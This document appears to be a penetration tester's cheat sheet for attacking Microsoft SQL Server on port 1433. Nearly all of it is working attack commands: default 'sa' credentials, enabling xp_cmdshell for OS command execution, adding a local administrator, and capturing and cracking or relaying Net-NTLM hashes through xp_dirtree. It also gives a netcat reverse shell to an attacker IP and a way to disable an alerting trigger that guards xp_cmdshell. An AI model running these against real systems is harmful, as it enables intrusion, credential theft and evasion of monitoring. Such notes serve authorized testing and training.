# 1433 - MSSQL

**Generic** : `dbeaver -h`

Default account for MS-SQL is the `sa` account (without password or with `sa`). This account is sysadmin on the database

* **mssqlclient.py** : `mssqlclient.py <USERNAME>:<PASSWORD>@<IP> -db <DATABASE> -p <PORT>`
* **mssql-cli** `mssql-cli -U '<USERNAME>' -P '<PASSWORD>' -S 10.203.130.16` to connect to the database.
  * List all the databases through `\ld`
  * List all the tables through `\lt`
  * List all users you can use to connect to the DB `SELECT * FROM SYS.SQL_LOGINS;`
  * Tips : When the result of the command is to big it is display inside a `less` command, to save the output in a file, scroll to the end, go up, lean `s`, write the name you want for the file
*   `sqsh -S <NAME>`

    * Configure : `/etc/freetds/freetds.conf`

    ```
    [<NAME>]
    host = 10.11.1.128
    port = 27900
    tds version = 8.0
    ```

    * Configure : `~/.sqshrc`

    ```
    \set username=sa
    \set password=password
    \set style=vert              
    ```

    * Some commands :
      * `SELECT name FROM master..sysdatabases` then `go`
      * `sp_databases` then `go`

The `xp_cmdshell` command can be used in the point to execute command on the system (in the context of the application).

* If you have command execution on a system with full privileges you can create a new administrator account on the system.
  * `net user <USERNAME> <PASSWORS> /ADD ; net localgroup administrators <USERNAME> /add`.
* It is also possible to use `xp_dirtree` to do UNC path injection in the point to grab a Net-NTLM hash on the network.
  * On the target do `EXEC master.sys.xp_dirtree '\\<TARGET>\\<SHARE>',0,1;`
  * On your machine do `responder -I <INTERFACE> -f --lm -w` or `sudo smbserver.py SHARE .` or `impacket-smbserver`
    * If you want to break the Net-NTLMv1/v2 hash : `john --format=netntlmv2 <HASHES> --wordlist=/<PATH>/<LIST>.txt`
    * If you want to do a NTLM-relay attack, on your machine do `sudo smbrelayx.py -h <IP_TO_RELAY> -c 'whoami'`
* **mssqlclient.py** : `mssqlclient.py <USERNAME>:<PASSWORD>@<IP> -db <DATABASE> -p <PORT>`
  * `enable xp_cmdshell`
  * `xp_cmdshell <COMMAND>`
    * List a directory : `xp_cmdshell "dir "<PATH>""`
    * Get a reverse shell : `xp_cmdshell "\\<IP>\nc.exe -nv <IP> 9999 -e cmd.exe"`
      * Listen locally `nc -nlvp 9999`
* **sqsh** : `sqsh -S <NAME>`
  * Configure : See below
  * Some commands : See below
  * Exploit xp\_cmdshell :
    * `exec sp_configure 'show advanced options', 1` then `go`
    * `reconfigure` then `go`
    * `exec sp_configure 'xp_cmdshell', 1` then `go`
    * `reconfigure` then `go`
    * `xp_cmdshell 'dir C:\'` then `go`
    * `xp_cmdshell 'whoami'` then `go`
* If `xp_cmdshell` is disable:
  * First try: `SQL> enable_xp_cmdshell`
  * Second try :
    * `SQL> sp_configure 'show advanced options', '1'`
    * `SQL> RECONFIGURE`
    * `SQL> sp_configure 'xp_cmdshell', '1'`
  * Third try: ([https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/](https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/))
    * `SQL> select name from sys.server_triggers;`
    * `SQL> disable trigger ALERT_xp_cmdshell on all server`
    * `SQL> enable_xp_cmdshell`
    * `SQL> xp_cmdshell whoami`
* **metasploit plugins** :
  * `auxiliary/admin/mssql/mssql_enum`
  * `auxiliary/admin/mssql/mssql_sql`
  * `auxiliary/admin/mssql/mssql_exec`
* `sp_execute_external_script` can also be used to execute scripts ([https://nielsberglund.com/2017/04/20/sql-server-2017---python-executing-inside-sql-server/](https://nielsberglund.com/2017/04/20/sql-server-2017---python-executing-inside-sql-server/))
  * `SQL> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';`



* Linked Servers :
  * [https://blog.netspi.com/how-to-hack-database-links-in-sql-server/](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
  * [https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#huh](https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#huh)
